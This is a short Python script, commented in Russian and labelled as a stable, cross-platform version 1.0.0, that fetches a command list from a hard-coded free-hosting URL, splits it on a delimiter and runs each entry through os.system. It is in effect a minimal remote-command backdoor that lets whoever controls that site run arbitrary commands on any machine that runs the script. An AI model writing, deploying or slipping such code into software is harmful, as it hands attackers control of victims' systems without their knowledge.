'''
версия 1.0.0
стабильная
кросплотформенная
без автозапуска
'''
import re, os, requests#библеотеки для работы

def get_html(url):#функцыя для скачивания листа с командами
	r = requests.get(url)#скачивание страницы
	return r.text.split("@#@") 

def mission(stur):#функция для очищения команд от спецсимволов и выполнение команд
	for wew in range(0,len(stur)):#цикл для перебора массива С командами
		pattern = r"\n"#спецсимвол который надо отрезать
		os.system(re.sub(pattern, "", stur[wew]))#команда отрезания спецсимволы и выполнение системные команды

wer = get_html('https://rstiller.000webhostapp.com/ret.yu')#выполняем функцию в аргументы которые выдаем сайт С командами
mission(wer)#передача массива на выполнение